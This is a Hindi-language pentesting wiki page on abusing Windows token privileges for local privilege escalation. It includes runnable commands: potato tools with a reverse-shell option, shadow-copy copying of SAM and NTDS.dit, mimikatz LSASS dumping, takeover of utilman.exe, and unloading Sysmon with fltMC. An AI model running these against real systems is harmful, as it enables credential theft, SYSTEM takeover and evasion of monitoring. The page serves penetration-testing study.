# Tokens का दुरुपयोग

{{#include ../../banners/hacktricks-training.md}}

## Tokens

यदि आपको **Windows Access Tokens क्या होते हैं, यह नहीं पता**, तो आगे बढ़ने से पहले यह पेज पढ़ें:


{{#ref}}
access-tokens.md
{{#endref}}

**आपके पास पहले से मौजूद tokens का दुरुपयोग करके privileges escalate करना संभव हो सकता है।**

### SeImpersonatePrivilege

यह privilege किसी process को token का handle प्राप्त होने पर उस token का impersonate करने की अनुमति देता है, लेकिन token बनाने की नहीं। किसी Windows service (DCOM) को exploit के विरुद्ध NTLM authentication करने के लिए प्रेरित करके एक privileged token प्राप्त किया जा सकता है, जिससे बाद में SYSTEM privileges के साथ process execute किया जा सकता है।<sup>[[2]](#references)</sup> इस primitive का exploitation [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (जिसके लिए WinRM का disabled होना आवश्यक है), [SweetPotato](https://github.com/CCob/SweetPotato), और [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) जैसे tools का उपयोग करके किया जा सकता है।

Modern operator notes:

- **JuicyPotato legacy है**: Windows 10 1809+/Server 2019+ पर, इस बात के आधार पर **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, या **PrintSpoofer** को प्राथमिकता दें कि कौन-सा RPC/COM surface अभी reachable है।
- यदि आपने **`LOCAL SERVICE`** या **`NETWORK SERVICE`** के रूप में चल रही service को compromise किया है और `whoami /priv` में **filtered token** दिखाई देता है, जिसमें `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` नहीं है, तो पहले account का **default privilege set** recover करें (उदाहरण के लिए **FullPowers** से), और उसके बाद potato family को फिर से आज़माएँ।<sup>[[3]](#references)</sup>
- कुछ नए forks मूल tools की तुलना में operator के लिए अधिक सुविधाजनक हैं। उदाहरण के लिए, **SigmaPotato** reflection/in-memory execution और modern Windows compatibility जोड़ता है, जबकि **PrintNotifyPotato** PrintNotify COM service का दुरुपयोग करता है और classic Spooler path disabled होने पर अक्सर उपयोगी होता है।
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

यह **SeImpersonatePrivilege** के समान है और privileged token प्राप्त करने के लिए **same method** का उपयोग करेगा।\
फिर, यह privilege किसी नए/suspended process को **primary token assign** करने की अनुमति देता है। Privileged impersonation token के साथ आप एक primary token derive कर सकते हैं (DuplicateTokenEx)।\
इस token के साथ, आप 'CreateProcessAsUser' का उपयोग करके **new process** बना सकते हैं या कोई process suspended अवस्था में create करके **set the token** कर सकते हैं (सामान्यतः, आप running process के primary token को modify नहीं कर सकते)।<sup>[[2]](#references)</sup>

### SeTcbPrivilege

यदि यह token enabled है, तो आप credentials जाने बिना किसी भी अन्य user के लिए **KERB_S4U_LOGON** का उपयोग करके एक **impersonation token** प्राप्त कर सकते हैं, token में एक **arbitrary group** (admins) जोड़ सकते हैं, token का **integrity level** "**medium**" पर set कर सकते हैं और इस token को **current thread** को assign कर सकते हैं (SetThreadToken)।<sup>[[2]](#references)</sup>

### SeBackupPrivilege

इस privilege के कारण system किसी भी file को सभी read access control **grant** करता है (केवल read operations तक सीमित)। इसका उपयोग registry से local **Administrator** accounts के **password hashes** पढ़ने के लिए किया जाता है। इसके बाद, "**psexec**" या "**wmiexec**" जैसे tools को hash के साथ उपयोग किया जा सकता है (Pass-the-Hash technique)। हालांकि, यह technique दो conditions में fail हो जाती है: जब Local Administrator account disabled हो, या जब ऐसी policy लागू हो जो remotely connect करने वाले Local Administrators से administrative rights हटा देती हो।<sup>[[2]](#references)</sup>\
व्यवहार में, सबसे reliable built-in workflow आमतौर पर **VSS + `robocopy /b`** होता है: एक shadow copy create/expose करें, फिर `SAM`/`SYSTEM` या `NTDS.dit` को **backup mode** में copy करें, जिससे file ACLs bypass हो जाती हैं।<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
आप इस **privilege** का **abuse** इन तरीकों से कर सकते हैं:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) में **IppSec** को follow करके
- या **Backup Operators के साथ escalating privileges** section में बताए गए तरीके के अनुसार:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

यह privilege किसी भी system file तक **write access** की permission देता है, चाहे उस file की Access Control List (ACL) कुछ भी हो। इससे escalation की कई संभावनाएँ खुल जाती हैं, जिनमें **modify services**, DLL Hijacking करना और Image File Execution Options के माध्यम से **debuggers** सेट करना शामिल हैं।<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege एक शक्तिशाली permission है, जो विशेष रूप से तब उपयोगी होती है जब किसी user के पास tokens को impersonate करने की ability हो, लेकिन SeImpersonatePrivilege उपलब्ध न हो। यह capability ऐसे token को impersonate करने की ability पर निर्भर करती है जो उसी user को represent करता हो और जिसका integrity level current process से अधिक न हो।<sup>[[2]](#references)</sup>

**मुख्य बिंदु:**

- **SeImpersonatePrivilege के बिना Impersonation:** विशिष्ट conditions में tokens को impersonate करके EoP के लिए SeCreateTokenPrivilege का लाभ उठाना संभव है।
- **Token Impersonation की Conditions:** सफल impersonation के लिए target token उसी user का होना चाहिए और उसका integrity level impersonation करने वाले process के integrity level से कम या उसके बराबर होना चाहिए।
- **Impersonation Tokens का Creation और Modification:** Users एक impersonation token बना सकते हैं और उसमें किसी privileged group का SID (Security Identifier) जोड़कर उसे अधिक privileges दे सकते हैं।

### SeLoadDriverPrivilege

यह privilege किसी process को specific `ImagePath` और `Type` values वाली registry entry बनाकर **device drivers को load और unload** करने की permission देता है। चूँकि `HKLM` (HKEY_LOCAL_MACHINE) तक direct write access restricted है, इसलिए इसके बजाय `HKCU` (HKEY_CURRENT_USER) का उपयोग किया जा सकता है। हालाँकि, `HKCU` entry को kernel द्वारा driver configuration के रूप में पहचानने योग्य बनाने के लिए एक specific path आवश्यक है।<sup>[[2]](#references)</sup>

Modern offensive use में आमतौर पर **BYOVD** (bring your own vulnerable driver) का उपयोग किया जाता है: एक **signed but vulnerable** kernel driver load करें और फिर उसकी IOCTLs का उपयोग protections को disable करने या kernel code execution तक पहुँचने के लिए करें। ध्यान रखें कि हाल के Windows 11/Server builds में **Microsoft vulnerable driver blocklist** और/या **HVCI/Memory Integrity** अक्सर पुराने public chains को विफल कर देते हैं, इसलिए classic `szkg64.sys`-style examples अब हर जगह विश्वसनीय नहीं हैं।

यह path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` है, जहाँ `<RID>` current user का Relative Identifier है। `HKCU` के अंदर यह पूरा path create करना होगा और दो values सेट करनी होंगी:<sup>[[2]](#references)</sup>

- `ImagePath`, जो execute की जाने वाली binary का path है
- `Type`, जिसकी value `SERVICE_KERNEL_DRIVER` (`0x00000001`) होनी चाहिए।

**अनुसरण करने के Steps:**

1. Restricted write access के कारण `HKLM` के बजाय `HKCU` को access करें।
2. `HKCU` के अंदर path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` create करें, जहाँ `<RID>` current user के Relative Identifier को दर्शाता है।
3. `ImagePath` को binary के execution path पर set करें।
4. `Type` को `SERVICE_KERNEL_DRIVER` (`0x00000001`) पर set करें।
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
इस privilege का दुरुपयोग करने के और तरीकों के लिए [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege) देखें।

### SeTakeOwnershipPrivilege

यह **SeRestorePrivilege** के समान है। इसका प्राथमिक कार्य किसी process को **किसी object का ownership ग्रहण करने** की अनुमति देना है, जिसमें WRITE_OWNER access rights प्रदान करके explicit discretionary access की आवश्यकता को दरकिनार किया जाता है। इस process में पहले इच्छित registry key का ownership सुरक्षित किया जाता है ताकि उसमें writing की जा सके, और फिर write operations सक्षम करने के लिए DACL को बदला जाता है।<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

यह privilege **अन्य processes को debug करने** की अनुमति देता है, जिसमें memory को read और write करना भी शामिल है। इस privilege के साथ memory injection की विभिन्न strategies का उपयोग किया जा सकता है, जो अधिकांश antivirus और host intrusion prevention solutions से बचने में सक्षम होती हैं।<sup>[[2]](#references)</sup>

आधुनिक Windows पर ध्यान रखें कि `SeDebugPrivilege` आमतौर पर **non-protected SYSTEM processes** को open करने और उनके tokens को duplicate करने के लिए पर्याप्त है, लेकिन यह **LSASS** को access करने की गारंटी **नहीं** देता। यदि **RunAsPPL / LSA Protection** enabled है, तो `SeDebugPrivilege` मौजूद होने पर भी non-protected processes LSASS को read या inject नहीं कर सकते। ऐसी स्थिति में किसी अन्य non-PPL SYSTEM process से token steal करें, या यह मानने के बजाय कि `procdump` काम करेगा, PPL bypass/BYOVD के साथ chain करें। `SeDebugPrivilege` + `SeImpersonatePrivilege` का उपयोग करके full token-copy example के लिए [यह page](sedebug-+-seimpersonate-copy-token.md) देखें।

#### Dump memory

आप [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) से [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) का उपयोग **किसी process की memory capture करने** के लिए कर सकते हैं। विशेष रूप से, इसे **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** process पर लागू किया जा सकता है, जो किसी user के system में सफलतापूर्वक log in करने के बाद उसके credentials store करने के लिए ज़िम्मेदार होता है।

इसके बाद passwords प्राप्त करने के लिए इस dump को mimikatz में load कर सकते हैं:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

यदि आप `NT SYSTEM` shell प्राप्त करना चाहते हैं, तो आप इनका उपयोग कर सकते हैं:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

यह अधिकार (Perform volume maintenance tasks) raw volume device handles (जैसे, \\.\C:) खोलने की अनुमति देता है, जिससे NTFS ACLs को bypass करके direct disk I/O किया जा सकता है। इसके द्वारा आप underlying blocks को पढ़कर volume पर मौजूद किसी भी file के bytes कॉपी कर सकते हैं, जिससे sensitive material की arbitrary file read संभव हो जाती है (जैसे, %ProgramData%\Microsoft\Crypto\ में machine private keys, registry hives, SAM/NTDS via VSS)।<sup>[[5]](#references)</sup> यह CA servers पर विशेष रूप से प्रभावशाली है, क्योंकि CA private key को exfiltrate करने से किसी भी principal का impersonation करने के लिए Golden Certificate forge किया जा सकता है।<sup>[[6]](#references)</sup>

विस्तृत techniques और mitigations देखें:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Privileges की जाँच करें
```
whoami /priv
```
**Disabled** के रूप में दिखाई देने वाले **tokens** को आमतौर पर enable किया जा सकता है, इसलिए आप अक्सर _Enabled_ और _Disabled_ दोनों privileges का abuse कर सकते हैं।

### सभी tokens enable करें

यदि आपके पास disabled privileges हैं, तो आप सभी tokens enable करने के लिए [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) script का उपयोग कर सकते हैं:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
या इस [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) में embedded **script**।

## Table

[https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) पर Full token privileges cheatsheet उपलब्ध है; नीचे दिया गया summary केवल privilege का फायदा उठाकर admin session प्राप्त करने या sensitive files पढ़ने के direct तरीकों की सूची देगा।<sup>[[1]](#references)</sup>

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"यह user को tokens impersonate करने और potato.exe, rottenpotato.exe तथा juicypotato.exe जैसे tools का उपयोग करके nt system तक privesc करने की अनुमति देगा"_                                                                                                                                                                                                      | Update के लिए [Aurélien Chalot](https://twitter.com/Defte_) को धन्यवाद। मैं जल्द ही इसे किसी recipe की तरह दोबारा लिखने का प्रयास करूंगा।                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | `robocopy /b` या dedicated SeBackup-aware copy helpers से sensitive files पढ़ें।                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, और कभी-कभी `%WINDIR%\MEMORY.DMP` के लिए उपयोगी।<br><br>- `robocopy` सुविधाजनक है, लेकिन locked/open files के लिए dedicated SeBackup cmdlets/APIs अक्सर अधिक flexible होते हैं।</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken` से local admin rights सहित arbitrary token बनाएं।                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | किसी **non-PPL** SYSTEM token को duplicate करें या किसी non-protected process से memory dump करें।                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection enabled होने पर LSASS dumping आमतौर पर blocked होती है।</p><p>Script [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) पर उपलब्ध है।</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | SYSTEM spawn करने के लिए **Potato family** / named-pipe impersonation का उपयोग करें (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, आदि)।                                                                                                                                                                                    | <p>IIS APPPOOL, MSSQL, scheduled tasks जैसे service accounts से, या ऐसे किसी context से यह सबसे practical है जिसके पास पहले से `SeImpersonatePrivilege` मौजूद हो।</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. एक signed-but-vulnerable kernel driver (BYOVD) load करें<br>2. Kernel R/W प्राप्त करने, security tooling disable करने, या SYSTEM तक elevate करने के लिए driver के IOCTLs का उपयोग करें<br><br>वैकल्पिक रूप से, इस privilege का उपयोग <code>fltMC</code> builtin command से security-related drivers unload करने के लिए किया जा सकता है, जैसे <code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code> जैसे पुराने public drivers को vulnerable-driver blocklist / HVCI के कारण modern Windows पर increasingly blocked किया जा रहा है।</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege मौजूद होने के साथ PowerShell/ISE launch करें।<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>) से privilege enable करें।<br>3. utilman.exe का नाम बदलकर utilman.old करें<br>4. cmd.exe का नाम बदलकर utilman.exe करें<br>5. Console को lock करें और Win+U दबाएं</p> | <p>कुछ AV software इस attack का पता लगा सकते हैं।</p><p>Alternative method इसी privilege का उपयोग करके "Program Files" में stored service binaries को replace करने पर निर्भर करता है।</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe का नाम बदलकर utilman.exe करें<br>4. Console को lock करें और Win+U दबाएं</p>                                                                                                                                       | <p>कुछ AV software इस attack का पता लगा सकते हैं।</p><p>Alternative method इसी privilege का उपयोग करके "Program Files" में stored service binaries को replace करने पर निर्भर करता है।</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Local admin rights शामिल करने के लिए tokens manipulate करें। SeImpersonate की आवश्यकता हो सकती है।</p><p>सत्यापन बाकी है।</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows privileges से admin तक exploitation paths](https://github.com/gtworek/Priv2Admin)
- [2] [LPE के लिए Token Privileges का दुरुपयोग](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – मेरी Privileges वापस दें! कृपया?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode file/folder ACL checks को bypass करता है)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Volume maintenance tasks करें (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
